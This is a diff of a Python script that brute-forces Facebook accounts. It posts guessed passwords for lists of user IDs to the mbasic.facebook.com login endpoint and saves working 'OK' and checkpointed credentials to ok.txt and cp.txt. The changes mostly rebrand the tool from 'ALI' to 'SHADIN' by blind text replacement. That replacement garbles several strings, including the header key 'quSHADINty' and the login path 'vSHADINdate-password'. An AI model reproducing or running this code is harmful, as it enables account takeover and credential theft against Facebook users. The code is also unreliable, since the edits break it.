@@ -9,7 +9,7 @@ from datetime import datetime
 from urllib.parse import quote
 import requests,bs4,sys,os,random,time,re,json,uuid,subprocess
 from random import randint
-r1=requests.get("https://github.com/AyeshaALI/File1/blob/main/ApprovemXD.txt").text
+r1=requests.get("https://github.com/AyeshaSHADIN/File1/blob/main/ApprovemXD.txt").text
 import requests, re, os, time
 import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
 from concurrent.futures import ThreadPoolExecutor as ADIabba
@@ -121,7 +121,7 @@ done = False
 birth = ['001', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21']
 bd = random.randint(2e7, 3e7)
 sim = random.randint(2e4, 4e4)
-header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT', 'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.3','x-fb-connection-type': 'unknown','content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
+header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim),'x-fb-connection-quSHADINty': 'EXCELLENT', 'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.3','x-fb-connection-type': 'unknown','content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 
 def main():
 	os.system('clear');print(banner)                                          
@@ -144,7 +144,7 @@ def main():
 	if Adi in ('0', '00'):
 		exit('THANKS FOR USING MARK TOOL')  
 	else:
-		print ('      Invalid Select')
+		print ('      InvSHADINd Select')
 		main()
 def banner():
 	print(banner)
@@ -173,7 +173,7 @@ class __crack__:
 		self.__pler__() 
 	def __mbasic__(self, user, _sempak_):
 		global ok,cp,loop
-		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mALI\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;36mTOTAL-Idz\033[1;37m] \033[1;37m[\033[1;36m{len(ok)}\033[1;37m]")
+		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mSHADIN\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;36mTOTAL-Idz\033[1;37m] \033[1;37m[\033[1;36m{len(ok)}\033[1;37m]")
 		sys.stdout.flush()
 		for pw in _sempak_:
 			pw = pw.lower()
@@ -188,15 +188,15 @@ class __crack__:
 			p = ses.get('https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
 			dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
 			_headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
-			po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
+			po = ses.post("https://mbasic.facebook.com/login/device-based/vSHADINdate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
 			if 'c_user' in ses.cookies.get_dict():
-				print('\r\033[1;37m[\033[1;32mALI-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
+				print('\r\033[1;37m[\033[1;32mSHADIN-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
 				wrt = '%s - %s' % (user,pw)
 				ok.append(wrt)
 				open('ok.txt','a').write('%s\n' % wrt)
 				break
 			elif 'checkpoint' in ses.cookies.get_dict():
-				print('\r\033[1;37m[\033[1;32mALI-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
+				print('\r\033[1;37m[\033[1;32mSHADIN-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
 				wrt = '%s - %s' % (user,pw)
 				ok.append(wrt)
 				open('cp.txt','a').write('%s\n' % wrt)
@@ -251,7 +251,7 @@ class __crack__:
 			time.sleep(1)
 			print('\033[1;37m[+]\033[1;33m File CLONING CP/OK IDS MIX ')
 			print('\033[1;37m[+]\033[1;36m TOTAL IDS \033[1;91m: \033[1;32m%s ' % len(self.id))
-			print('\033[1;37m[+]\033[1;36mALi PROCESS HAS BEEN STARTED')
+			print('\033[1;37m[+]\033[1;36mSHADIN PROCESS HAS BEEN STARTED')
 			print(50*"\033[1;97m_")
 			print('      \033[1;97m\033[1;41m [ IF  NO RESULT USE AIRPLANE MODE ] \033[0m\033[1;93m')
 			print(50*"\033[1;97m_")
@@ -329,7 +329,7 @@ class __filecrack3__:
 		self.__pler__()
 	def __mbasic__(self, user, _sempak_):
 		global ok,cp,loop
-		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mALI\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;32mOK-{len(ok)}\033[1;37m] ")
+		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mSHADIN\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;32mOK-{len(ok)}\033[1;37m] ")
 		sys.stdout.flush()
 		for pw in _sempak_:
 			pw = pw.lower()
@@ -344,7 +344,7 @@ class __filecrack3__:
 			p = ses.get('https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
 			dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
 			_headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
-			po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
+			po = ses.post("https://mbasic.facebook.com/login/device-based/vSHADINdate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
 			if 'c_user' in ses.cookies.get_dict():
 				print('\r\033[1;37m[\033[1;32mSHADIN-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
 				wrt = '%s - %s' % (user,pw)
